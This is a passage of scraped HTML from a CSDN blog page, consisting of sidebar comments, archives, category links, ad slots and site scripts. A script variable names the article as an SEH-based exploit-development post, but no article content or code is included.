                <a class="title text-truncate" target="_blank" href="https://blog.csdn.net/dupei/article/details/102695932#comments_15020045" data-report-click='{"mod":"popu_542","spm":"1001.2101.3001.4231","dest":"https://blog.csdn.net/dupei/article/details/102695932#comments_15020045","ab":"new"}' data-report-view='{"mod":"popu_542","spm":"1001.2101.3001.4231","dest":"https://blog.csdn.net/dupei/article/details/102695932#comments_15020045","ab":"new"}'>李宏毅《GAN Lecture》学习笔记8 - Photo Editing</a>
                <p class="comment ellipsis">
                    <a href="https://blog.csdn.net/qq_45937199" class="user-name" target="_blank">ctotalk: </a>
                    <span class="code-comments">不错，学习了。</span>
                </p>
            </li>
            <li>
                <a class="title text-truncate" target="_blank" href="https://blog.csdn.net/dupei/article/details/106144991#comments_14124534" data-report-click='{"mod":"popu_542","spm":"1001.2101.3001.4231","dest":"https://blog.csdn.net/dupei/article/details/106144991#comments_14124534","ab":"new"}' data-report-view='{"mod":"popu_542","spm":"1001.2101.3001.4231","dest":"https://blog.csdn.net/dupei/article/details/106144991#comments_14124534","ab":"new"}'>使用sox命令行工具录制语音</a>
                <p class="comment ellipsis">
                    <a href="https://blog.csdn.net/weixin_40278530" class="user-name" target="_blank">叽里咕噜象: </a>
                    <span class="code-comments">请问有遇到play语音播放不完整的情况吗？</span>
                </p>
            </li>
            <li>
                <a class="title text-truncate" target="_blank" href="https://blog.csdn.net/dupei/article/details/103469407#comments_13503234" data-report-click='{"mod":"popu_542","spm":"1001.2101.3001.4231","dest":"https://blog.csdn.net/dupei/article/details/103469407#comments_13503234","ab":"new"}' data-report-view='{"mod":"popu_542","spm":"1001.2101.3001.4231","dest":"https://blog.csdn.net/dupei/article/details/103469407#comments_13503234","ab":"new"}'>使用mmdnn将MXNET转成Tensorflow模型</a>
                <p class="comment ellipsis">
                    <a href="https://blog.csdn.net/qq_45069279" class="user-name" target="_blank">苜苜的烂笔头: </a>
                    <span class="code-comments">干货满满，很详细，评论占个坑。</span>
                </p>
            </li>
            <li>
                <a class="title text-truncate" target="_blank" href="https://blog.csdn.net/dupei/article/details/101019987#comments_12966048" data-report-click='{"mod":"popu_542","spm":"1001.2101.3001.4231","dest":"https://blog.csdn.net/dupei/article/details/101019987#comments_12966048","ab":"new"}' data-report-view='{"mod":"popu_542","spm":"1001.2101.3001.4231","dest":"https://blog.csdn.net/dupei/article/details/101019987#comments_12966048","ab":"new"}'>安装NVIDIA显卡驱动</a>
                <p class="comment ellipsis">
                    <a href="https://blog.csdn.net/weixin_46296454" class="user-name" target="_blank">xyZeng?: </a>
                    <span class="code-comments">请问nvidia-smi后，显示的GeForce RTX 208...这个省略的信息如何让系统显示全？</span>
                </p>
            </li>
            <li>
                <a class="title text-truncate" target="_blank" href="https://blog.csdn.net/dupei/article/details/103803992#comments_11342893" data-report-click='{"mod":"popu_542","spm":"1001.2101.3001.4231","dest":"https://blog.csdn.net/dupei/article/details/103803992#comments_11342893","ab":"new"}' data-report-view='{"mod":"popu_542","spm":"1001.2101.3001.4231","dest":"https://blog.csdn.net/dupei/article/details/103803992#comments_11342893","ab":"new"}'>Linux环境下查看内存信息</a>
                <p class="comment ellipsis">
                    <a href="https://li-lei.blog.csdn.net" class="user-name" target="_blank">程序猿杂记: </a>
                    <span class="code-comments">大佬大佬!</span>
                </p>
            </li>
        </ul>
    </div>
</div>
<div id="asideArchive" class="aside-box" style="display:block!important; width:300px;">
    <h3 class="aside-title">最新文章</h3>
    <div class="aside-content">
        <ul class="inf_list clearfix">
            <li class="clearfix">
            <a href="https://blog.csdn.net/dupei/article/details/115162341" target="_blank" data-report-click='{"mod":"popu_382","spm":"1001.2101.3001.4136","dest":"https://blog.csdn.net/dupei/article/details/115162341","ab":"new"}' data-report-view='{"mod":"popu_382","dest":"https://blog.csdn.net/dupei/article/details/115162341","ab":"new"}'>iptables命令</a>
            </li>
            <li class="clearfix">
            <a href="https://blog.csdn.net/dupei/article/details/115008669" target="_blank" data-report-click='{"mod":"popu_382","spm":"1001.2101.3001.4136","dest":"https://blog.csdn.net/dupei/article/details/115008669","ab":"new"}' data-report-view='{"mod":"popu_382","dest":"https://blog.csdn.net/dupei/article/details/115008669","ab":"new"}'>Docker常用命令</a>
            </li>
            <li class="clearfix">
            <a href="https://blog.csdn.net/dupei/article/details/112073395" target="_blank" data-report-click='{"mod":"popu_382","spm":"1001.2101.3001.4136","dest":"https://blog.csdn.net/dupei/article/details/112073395","ab":"new"}' data-report-view='{"mod":"popu_382","dest":"https://blog.csdn.net/dupei/article/details/112073395","ab":"new"}'>SpringBoot环境搭建</a>
            </li>
        </ul>
        <div class="archive-bar"></div>
        <div class="archive-box">
                <div class="archive-list-item"><a href="https://blog.csdn.net/dupei/article/month/2021/03" target="_blank" data-report-click='{"mod":"popu_538","spm":"1001.2101.3001.4138","ab":"new","dest":""}'><span class="year">2021年</span><span class="num">3篇</span></a></div>
                <div class="archive-list-item"><a href="https://blog.csdn.net/dupei/article/month/2020/11" target="_blank" data-report-click='{"mod":"popu_538","spm":"1001.2101.3001.4138","ab":"new","dest":""}'><span class="year">2020年</span><span class="num">16篇</span></a></div>
                <div class="archive-list-item"><a href="https://blog.csdn.net/dupei/article/month/2019/12" target="_blank" data-report-click='{"mod":"popu_538","spm":"1001.2101.3001.4138","ab":"new","dest":""}'><span class="year">2019年</span><span class="num">23篇</span></a></div>
                <div class="archive-list-item"><a href="https://blog.csdn.net/dupei/article/month/2016/12" target="_blank" data-report-click='{"mod":"popu_538","spm":"1001.2101.3001.4138","ab":"new","dest":""}'><span class="year">2016年</span><span class="num">2篇</span></a></div>
                <div class="archive-list-item"><a href="https://blog.csdn.net/dupei/article/month/2014/02" target="_blank" data-report-click='{"mod":"popu_538","spm":"1001.2101.3001.4138","ab":"new","dest":""}'><span class="year">2014年</span><span class="num">1篇</span></a></div>
                <div class="archive-list-item"><a href="https://blog.csdn.net/dupei/article/month/2012/03" target="_blank" data-report-click='{"mod":"popu_538","spm":"1001.2101.3001.4138","ab":"new","dest":""}'><span class="year">2012年</span><span class="num">2篇</span></a></div>
                <div class="archive-list-item"><a href="https://blog.csdn.net/dupei/article/month/2011/05" target="_blank" data-report-click='{"mod":"popu_538","spm":"1001.2101.3001.4138","ab":"new","dest":""}'><span class="year">2011年</span><span class="num">17篇</span></a></div>
                <div class="archive-list-item"><a href="https://blog.csdn.net/dupei/article/month/2010/12" target="_blank" data-report-click='{"mod":"popu_538","spm":"1001.2101.3001.4138","ab":"new","dest":""}'><span class="year">2010年</span><span class="num">12篇</span></a></div>
                <div class="archive-list-item"><a href="https://blog.csdn.net/dupei/article/month/2009/10" target="_blank" data-report-click='{"mod":"popu_538","spm":"1001.2101.3001.4138","ab":"new","dest":""}'><span class="year">2009年</span><span class="num">9篇</span></a></div>
        </div>
    </div>
</div>
	<div id="footerRightAds" class="isShowFooterAds">
		<div class="aside-box">
			<div id="kp_box_57" data-pid="57"><script__ async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script__>
<!-- PC-博客详情页-左下视窗（300*600） -->
<ins class="adsbygoogle"
     style="display:block"
     data-ad-client="ca-pub-1076724771190722"
     data-ad-slot="1173711872"
     data-ad-format="auto"
     data-full-width-responsive="true"></ins>
<script__>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script__><img class="pre-img-lasy" data-src="https://kunyu.csdn.net/1.png?p=57&a=2488&c=0&k=&spm=1001.2101.3001.5001&d=1&t=3&u=29f4c1fbd38e46909446dc40a7f8e6bd" style="display: block;width: 0px;height: 0px;"></div>
		</div>
	</div>
    <!-- 详情页显示目录 -->
<!--文章目录-->
<div id="asidedirectory" class="aside-box">
    <div class='groupfile' id="directory">
        <h3 class="aside-title">目录</h3>
        <div class="align-items-stretch group_item">
            <div class="pos-box">
            <div class="scroll-box">
                <div class="toc-box"></div>
            </div>
            </div>
        </div>
    </div>
</div>
</aside>
<script__>
	$("a.flexible-btn").click(function(){
		$(this).parents('div.aside-box').removeClass('flexible-box');
		$(this).parents("p.text-center").remove();
	})
</script__>
<script__ type="text/javascript"  src="https://g.csdnimg.cn/user-tooltip/2.4/user-tooltip.js"></script__>
<script__ type="text/javascript"  src="https://g.csdnimg.cn/user-medal/1.0.6/user-medal.js"></script__>    </div>
<div class="recommend-right  align-items-stretch clearfix" id="rightAside" data-type="recommend">
    <aside class="recommend-right_aside">
        <div id="recommend-right" >
                        <div class='flex-column aside-box groupfile' id="groupfile">
                <div class="groupfile-div">
                <h3 class="aside-title">目录</h3>
                <div class="align-items-stretch group_item">
                    <div class="pos-box">
                        <div class="scroll-box">
                            <div class="toc-box"></div>
                        </div>
                    </div>
                </div>
                </div>
            </div>
                <div id="recommendAdBox">
                    <div id="kp_box_479" data-pid="479"><script__ async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script__>
<!-- PC-博客详情页-右侧视窗300*600 -->
<ins class="adsbygoogle"
     style="display:block"
     data-ad-client="ca-pub-1076724771190722"
     data-ad-slot="8441704093"
     data-ad-format="auto"
     data-full-width-responsive="true"></ins>
<script__>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script__><img class="pre-img-lasy" data-src="https://kunyu.csdn.net/1.png?p=479&a=2487&c=0&k=&spm=1001.2101.3001.4834&d=1&t=3&u=195aeb967ba349c98a5053fa75436565" style="display: block;width: 0px;height: 0px;"></div>
                </div>
            <div class='aside-box kind_person d-flex flex-column'>
                    <h3 class="aside-title">分类专栏</h3>
                    <div class="align-items-stretch kindof_item" id="kind_person_column">
                        <div class="aside-content">
                            <ul>
                                <li class="">
                                    <a class="clearfix" target="_blank" href="https://blog.csdn.net/dupei/category_769978.html" data-report-click='{"mod":"popu_537","spm":"1001.2101.3001.4137","strategy":"pc付费专栏左侧入口","dest":"https://blog.csdn.net/dupei/category_769978.html","ab":"new"}'>
                                        <img src="https://img-blog.csdnimg.cn/20201014180756738.png?x-oss-process=image/resize,m_fixed,h_64,w_64" alt="" onerror="this.src='https://img-blog.csdnimg.cn/20201014180756922.png?x-oss-process=image/resize,m_fixed,h_64,w_64'">
                                        <span class="title oneline">
                                            <span class="text">C++</span>
                                        </span>
                                        <span class="count float-right">4篇</span>
                                    </a>
                                </li>
                                <li class="">
                                    <a class="clearfix" target="_blank" href="https://blog.csdn.net/dupei/category_10899309.html" data-report-click='{"mod":"popu_537","spm":"1001.2101.3001.4137","strategy":"pc付费专栏左侧入口","dest":"https://blog.csdn.net/dupei/category_10899309.html","ab":"new"}'>
                                        <img src="https://img-blog.csdnimg.cn/20201014180756928.png?x-oss-process=image/resize,m_fixed,h_64,w_64" alt="" onerror="this.src='https://img-blog.csdnimg.cn/20201014180756922.png?x-oss-process=image/resize,m_fixed,h_64,w_64'">
                                        <span class="title oneline">
                                            <span class="text">容器</span>
                                        </span>
                                    </a>
                                </li>
                                <li class="">
                                    <a class="clearfix" target="_blank" href="https://blog.csdn.net/dupei/category_10706335.html" data-report-click='{"mod":"popu_537","spm":"1001.2101.3001.4137","strategy":"pc付费专栏左侧入口","dest":"https://blog.csdn.net/dupei/category_10706335.html","ab":"new"}'>
                                        <img src="https://img-blog.csdnimg.cn/20201014180756780.png?x-oss-process=image/resize,m_fixed,h_64,w_64" alt="" onerror="this.src='https://img-blog.csdnimg.cn/20201014180756922.png?x-oss-process=image/resize,m_fixed,h_64,w_64'">
                                        <span class="title oneline">
                                            <span class="text">Java</span>
                                        </span>
                                        <span class="count float-right">1篇</span>
                                    </a>
                                </li>
                                <li class="">
                                    <a class="clearfix" target="_blank" href="https://blog.csdn.net/dupei/category_9855590.html" data-report-click='{"mod":"popu_537","spm":"1001.2101.3001.4137","strategy":"pc付费专栏左侧入口","dest":"https://blog.csdn.net/dupei/category_9855590.html","ab":"new"}'>
                                        <img src="https://img-blog.csdnimg.cn/20201014180756926.png?x-oss-process=image/resize,m_fixed,h_64,w_64" alt="" onerror="this.src='https://img-blog.csdnimg.cn/20201014180756922.png?x-oss-process=image/resize,m_fixed,h_64,w_64'">
                                        <span class="title oneline">
                                            <span class="text">Deep Learning</span>
                                        </span>
                                        <span class="count float-right">6篇</span>
                                    </a>
                                </li>
                                <li class="">
                                    <a class="clearfix" target="_blank" href="https://blog.csdn.net/dupei/category_9426921.html" data-report-click='{"mod":"popu_537","spm":"1001.2101.3001.4137","strategy":"pc付费专栏左侧入口","dest":"https://blog.csdn.net/dupei/category_9426921.html","ab":"new"}'>
                                        <img src="https://img-blog.csdnimg.cn/20201014180756928.png?x-oss-process=image/resize,m_fixed,h_64,w_64" alt="" onerror="this.src='https://img-blog.csdnimg.cn/20201014180756922.png?x-oss-process=image/resize,m_fixed,h_64,w_64'">
                                        <span class="title oneline">
                                            <span class="text">学习笔记</span>
                                        </span>
                                        <span class="count float-right">12篇</span>
                                    </a>
                                </li>
                                <li class="">
                                    <a class="clearfix" target="_blank" href="https://blog.csdn.net/dupei/category_9563438.html" data-report-click='{"mod":"popu_537","spm":"1001.2101.3001.4137","strategy":"pc付费专栏左侧入口","dest":"https://blog.csdn.net/dupei/category_9563438.html","ab":"new"}'>
                                        <img src="https://img-blog.csdnimg.cn/20201014180756738.png?x-oss-process=image/resize,m_fixed,h_64,w_64" alt="" onerror="this.src='https://img-blog.csdnimg.cn/20201014180756922.png?x-oss-process=image/resize,m_fixed,h_64,w_64'">
                                        <span class="title oneline">
                                            <span class="text">Tensorflow</span>
                                        </span>
                                        <span class="count float-right">5篇</span>
                                    </a>
                                </li>
                                <li class="">
                                    <a class="clearfix" target="_blank" href="https://blog.csdn.net/dupei/category_9364486.html" data-report-click='{"mod":"popu_537","spm":"1001.2101.3001.4137","strategy":"pc付费专栏左侧入口","dest":"https://blog.csdn.net/dupei/category_9364486.html","ab":"new"}'>
                                        <img src="https://img-blog.csdnimg.cn/20201014180756918.png?x-oss-process=image/resize,m_fixed,h_64,w_64" alt="" onerror="this.src='https://img-blog.csdnimg.cn/20201014180756922.png?x-oss-process=image/resize,m_fixed,h_64,w_64'">
                                        <span class="title oneline">
                                            <span class="text">开发环境</span>
                                        </span>
                                        <span class="count float-right">4篇</span>
                                    </a>
                                </li>
                                <li class="">
                                    <a class="clearfix" target="_blank" href="https://blog.csdn.net/dupei/category_9800364.html" data-report-click='{"mod":"popu_537","spm":"1001.2101.3001.4137","strategy":"pc付费专栏左侧入口","dest":"https://blog.csdn.net/dupei/category_9800364.html","ab":"new"}'>
                                        <img src="https://img-blog.csdnimg.cn/20201014180756925.png?x-oss-process=image/resize,m_fixed,h_64,w_64" alt="" onerror="this.src='https://img-blog.csdnimg.cn/20201014180756922.png?x-oss-process=image/resize,m_fixed,h_64,w_64'">
                                        <span class="title oneline">
                                            <span class="text">Speech Recognition</span>
                                        </span>
                                        <span class="count float-right">5篇</span>
                                    </a>
                                </li>
                                <li class="">
                                    <a class="clearfix" target="_blank" href="https://blog.csdn.net/dupei/category_9426918.html" data-report-click='{"mod":"popu_537","spm":"1001.2101.3001.4137","strategy":"pc付费专栏左侧入口","dest":"https://blog.csdn.net/dupei/category_9426918.html","ab":"new"}'>
                                        <img src="https://img-blog.csdnimg.cn/20201014180756738.png?x-oss-process=image/resize,m_fixed,h_64,w_64" alt="" onerror="this.src='https://img-blog.csdnimg.cn/20201014180756922.png?x-oss-process=image/resize,m_fixed,h_64,w_64'">
                                        <span class="title oneline">
                                            <span class="text">GAN</span>
                                        </span>
                                        <span class="count float-right">8篇</span>
                                    </a>
                                </li>
                                <li class="">
                                    <a class="clearfix" target="_blank" href="https://blog.csdn.net/dupei/category_9580732.html" data-report-click='{"mod":"popu_537","spm":"1001.2101.3001.4137","strategy":"pc付费专栏左侧入口","dest":"https://blog.csdn.net/dupei/category_9580732.html","ab":"new"}'>
                                        <img src="https://img-blog.csdnimg.cn/20201014180756919.png?x-oss-process=image/resize,m_fixed,h_64,w_64" alt="" onerror="this.src='https://img-blog.csdnimg.cn/20201014180756922.png?x-oss-process=image/resize,m_fixed,h_64,w_64'">
                                        <span class="title oneline">
                                            <span class="text">mmdnn</span>
                                        </span>
                                        <span class="count float-right">1篇</span>
                                    </a>
                                </li>
                                <li class="">
                                    <a class="clearfix" target="_blank" href="https://blog.csdn.net/dupei/category_9579396.html" data-report-click='{"mod":"popu_537","spm":"1001.2101.3001.4137","strategy":"pc付费专栏左侧入口","dest":"https://blog.csdn.net/dupei/category_9579396.html","ab":"new"}'>
                                        <img src="https://img-blog.csdnimg.cn/20201014180756757.png?x-oss-process=image/resize,m_fixed,h_64,w_64" alt="" onerror="this.src='https://img-blog.csdnimg.cn/20201014180756922.png?x-oss-process=image/resize,m_fixed,h_64,w_64'">
                                        <span class="title oneline">
                                            <span class="text">docker</span>
                                        </span>
                                        <span class="count float-right">1篇</span>
                                    </a>
                                </li>
                                <li class="">
                                    <a class="clearfix" target="_blank" href="https://blog.csdn.net/dupei/category_9367884.html" data-report-click='{"mod":"popu_537","spm":"1001.2101.3001.4137","strategy":"pc付费专栏左侧入口","dest":"https://blog.csdn.net/dupei/category_9367884.html","ab":"new"}'>
                                        <img src="https://img-blog.csdnimg.cn/20201014180756925.png?x-oss-process=image/resize,m_fixed,h_64,w_64" alt="" onerror="this.src='https://img-blog.csdnimg.cn/20201014180756922.png?x-oss-process=image/resize,m_fixed,h_64,w_64'">
                                        <span class="title oneline">
                                            <span class="text">python</span>
                                        </span>
                                        <span class="count float-right">1篇</span>
                                    </a>
                                </li>
                                <li class="">
                                    <a class="clearfix" target="_blank" href="https://blog.csdn.net/dupei/category_9364546.html" data-report-click='{"mod":"popu_537","spm":"1001.2101.3001.4137","strategy":"pc付费专栏左侧入口","dest":"https://blog.csdn.net/dupei/category_9364546.html","ab":"new"}'>
                                        <img src="https://img-blog.csdnimg.cn/20201014180756918.png?x-oss-process=image/resize,m_fixed,h_64,w_64" alt="" onerror="this.src='https://img-blog.csdnimg.cn/20201014180756922.png?x-oss-process=image/resize,m_fixed,h_64,w_64'">
                                        <span class="title oneline">
                                            <span class="text">iOS</span>
                                        </span>
                                        <span class="count float-right">1篇</span>
                                    </a>
                                </li>
                                <li class="">
                                    <a class="clearfix" target="_blank" href="https://blog.csdn.net/dupei/category_9325021.html" data-report-click='{"mod":"popu_537","spm":"1001.2101.3001.4137","strategy":"pc付费专栏左侧入口","dest":"https://blog.csdn.net/dupei/category_9325021.html","ab":"new"}'>
                                        <img src="https://img-blog.csdnimg.cn/20201014180756928.png?x-oss-process=image/resize,m_fixed,h_64,w_64" alt="" onerror="this.src='https://img-blog.csdnimg.cn/20201014180756922.png?x-oss-process=image/resize,m_fixed,h_64,w_64'">
                                        <span class="title oneline">
                                            <span class="text">Android</span>
                                        </span>
                                        <span class="count float-right">2篇</span>
                                    </a>
                                </li>
                                <li class="">
                                    <a class="clearfix" target="_blank" href="https://blog.csdn.net/dupei/category_773206.html" data-report-click='{"mod":"popu_537","spm":"1001.2101.3001.4137","strategy":"pc付费专栏左侧入口","dest":"https://blog.csdn.net/dupei/category_773206.html","ab":"new"}'>
                                        <img src="https://img-blog.csdnimg.cn/20201014180756918.png?x-oss-process=image/resize,m_fixed,h_64,w_64" alt="" onerror="this.src='https://img-blog.csdnimg.cn/20201014180756922.png?x-oss-process=image/resize,m_fixed,h_64,w_64'">
                                        <span class="title oneline">
                                            <span class="text">Linux</span>
                                        </span>
                                        <span class="count float-right">17篇</span>
                                    </a>
                                </li>
                                <li class="">
                                    <a class="clearfix" target="_blank" href="https://blog.csdn.net/dupei/category_791549.html" data-report-click='{"mod":"popu_537","spm":"1001.2101.3001.4137","strategy":"pc付费专栏左侧入口","dest":"https://blog.csdn.net/dupei/category_791549.html","ab":"new"}'>
                                        <img src="https://img-blog.csdnimg.cn/20201014180756928.png?x-oss-process=image/resize,m_fixed,h_64,w_64" alt="" onerror="this.src='https://img-blog.csdnimg.cn/20201014180756922.png?x-oss-process=image/resize,m_fixed,h_64,w_64'">
                                        <span class="title oneline">
                                            <span class="text">MachineLearning</span>
                                        </span>
                                        <span class="count float-right">11篇</span>
                                    </a>
                                </li>
                                <li class="">
                                    <a class="clearfix" target="_blank" href="https://blog.csdn.net/dupei/category_879039.html" data-report-click='{"mod":"popu_537","spm":"1001.2101.3001.4137","strategy":"pc付费专栏左侧入口","dest":"https://blog.csdn.net/dupei/category_879039.html","ab":"new"}'>
                                        <img src="https://img-blog.csdnimg.cn/20201014180756724.png?x-oss-process=image/resize,m_fixed,h_64,w_64" alt="" onerror="this.src='https://img-blog.csdnimg.cn/20201014180756922.png?x-oss-process=image/resize,m_fixed,h_64,w_64'">
                                        <span class="title oneline">
                                            <span class="text">Security</span>
                                        </span>
                                        <span class="count float-right">4篇</span>
                                    </a>
                                </li>
                                <li class="">
                                    <a class="clearfix" target="_blank" href="https://blog.csdn.net/dupei/category_6523929.html" data-report-click='{"mod":"popu_537","spm":"1001.2101.3001.4137","strategy":"pc付费专栏左侧入口","dest":"https://blog.csdn.net/dupei/category_6523929.html","ab":"new"}'>
                                        <img src="https://img-blog.csdnimg.cn/20201014180756928.png?x-oss-process=image/resize,m_fixed,h_64,w_64" alt="" onerror="this.src='https://img-blog.csdnimg.cn/20201014180756922.png?x-oss-process=image/resize,m_fixed,h_64,w_64'">
                                        <span class="title oneline">
                                            <span class="text">杂项</span>
                                        </span>
                                        <span class="count float-right">8篇</span>
                                    </a>
                                </li>
                                <li class="">
                                    <a class="clearfix" target="_blank" href="https://blog.csdn.net/dupei/category_9245421.html" data-report-click='{"mod":"popu_537","spm":"1001.2101.3001.4137","strategy":"pc付费专栏左侧入口","dest":"https://blog.csdn.net/dupei/category_9245421.html","ab":"new"}'>
                                        <img src="https://img-blog.csdnimg.cn/20201014180756928.png?x-oss-process=image/resize,m_fixed,h_64,w_64" alt="" onerror="this.src='https://img-blog.csdnimg.cn/20201014180756922.png?x-oss-process=image/resize,m_fixed,h_64,w_64'">
                                        <span class="title oneline">
                                            <span class="text">逆向分析</span>
                                        </span>
                                        <span class="count float-right">3篇</span>
                                    </a>
                                </li>
                            </ul>
                        </div>
                    </div>
            </div>
        </div>
    </aside>
</div>

</div>
<div class="mask-dark"></div>
<script__ type="text/javascript">
    var timert = setInterval(function(){
      sideToolbar = $(".csdn-side-toolbar");
      if (sideToolbar.length > 0) {
        sideToolbar.css('cssText','bottom:64px !important;')
        clearInterval(timert);
      }
    }, 200);
</script__>
<script__>
    var articleId = 53731221;
    var commentscount = 0;
    var curentUrl = "https://blog.csdn.net/dupei/article/details/53731221";
    var myUrl = "https://my.csdn.net/";
    var highlight = ["Exploit","Development","使用","SEH","绕过","Security","Cookie"];//高亮数组
    var isRecommendModule = true;
    var isBaiduPre = true;
    var baiduCount = 2;
    var share_card_url = "https://blog.csdn.net/dupei/article/shareArticleCardPage?article_id=53731221"
	var articleType = 1;
    var baiduKey = "Exploit Development – 使用SEH绕过Security Cookie";
    var userNewReport = false;
    var needInsertBaidu = true;
    var recommendRegularDomainArr = ["blog.csdn.net/.+/article/details/","download.csdn.net/download/","edu.csdn.net/course/detail/","ask.csdn.net/questions/","bbs.csdn.net/topics/","www.csdn.net/gather_.+/"]
    var codeStyle = "";
    var baiduSearchType = "title";
    var canRead = true;
    var blogMoveHomeArticle = false;
    var showPcWindowAd = false;
    var showSearchText = "";
    var linkPage = true;
    var articleSource = 1;
    var articleReport = '{"pid": "blog", "spm":"1001.2101"}';
</script__>
<script__ src="https://csdnimg.cn/public/sandalstrap/1.4/js/sandalstrap.min.js"></script__>
<div class="skin-boxshadow"></div>
 
</body>
<script__ src="https://csdnimg.cn/release/blogv2/dist/components/js/pc_wap_highlight-db1e81323a.min.js" type="text/javascript"></script__>
<script__ src="https://csdnimg.cn/release/blogv2/dist/components/js/pc_wap_common-906586e915.min.js" type="text/javascript"></script__>
<link rel="stylesheet" href="https://csdnimg.cn/release/blog_editor_html/release1.6.12/ckeditor/plugins/codesnippet/lib/highlight/styles/atom-one-light.css">
<script__>
 // 全局声明
 if (window.csdn === undefined) {
      window.csdn = {};
    }
    window.csdn.sideToolbar = {
        options: {
            report:{
                isShow: true,
            },
            qr: {
                isShow: false,
            },
            guide: {
                isShow: true
            }
        }
    }
    $(function(){
        $(document).on('click',"a.option-box[data-type='report']",function() {
            window.csdn.userLogin.loadAjax(function(res){
                if(userNewReport){
                    showReportNew(false,articleTitles);
                }else{
                    showReport(false,articleTitles);
                }
            })
        });
    })
</script__>
    <script__ src="https://g.csdnimg.cn/baidu-search/1.0.9/baidu-search.js"  type="text/javascript"></script__>
<script__ src="https://csdnimg.cn/release/download/old_static/js/qrcode.js"></script__>
<script__ src="https://csdnimg.cn/release/blogv2/dist/pc/js/common-cc21cbaf03.min.js" type="text/javascript"></script__>
<script__ src="https://csdnimg.cn/release/blogv2/dist/pc/js/detail-58c68b5ed8.min.js" type="text/javascript"></script__>
<script__ src="https://g.csdnimg.cn/user-ordercart/1.0.6/user-ordercart.js" type="text/javascript"></script__>
<script__ src="https://csdnimg.cn/release/blogv2/dist/pc/js/column-78261cfea6.min.js" type="text/javascript"></script__>
<script__ src="https://g.csdnimg.cn/side-toolbar/3.0/side-toolbar.js" type="text/javascript"></script__>
<script__ src="https://g.csdnimg.cn/common/shop-window-v2/shop-window.js" type="text/javascript"></script__>
<script__>
    var shopUserName = username;
    ;$(function(){
        window.csdn.shop.show({
            userName: shopUserName,
            topEl: $("#csdn-shop-window-top"),
            bottomEl: $("#csdn-shop-window"),
            callBack: function(res){
                if(!res.top){
                    $("#blogColumnPayAdvert").css({"display":"block"})
                    $("#csdn-shop-window-top").css({"display":"none"})
                }
            }
        })
    })
</script__>
<script__ src="https://g.csdnimg.cn/copyright/1.0.3/copyright.js" type="text/javascript"></script__>
<script__>
    $(".MathJax").remove();
    if ($('div.markdown_views pre.prettyprint code.hljs').length > 0) {
        $('div.markdown_views')[0].className = 'markdown_views';
    }
</script__>
<script__ type="text/javascript" src="https://csdnimg.cn/release/blog_mathjax/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script__>
<script__ type="text/x-mathjax-config">
    MathJax.Hub.Config({
            "HTML-CSS": {
                    linebreaks: { automatic: true, width: "94%container" },
                    imageFont: null
            },
            tex2jax: {
                preview: "none",
                ignoreClass:"title-article"
            },
            mml2jax: {
                preview: 'none'
            }
    });
</script__>
<script__ type="text/javascript" crossorigin src="https://g.csdnimg.cn/user-login/2.3.2/user-login.js"></script__>
<script__ type="text/javascript" crossorigin src="https://g.csdnimg.cn/login-box/1.1.4/login-box.js"></script__></html>
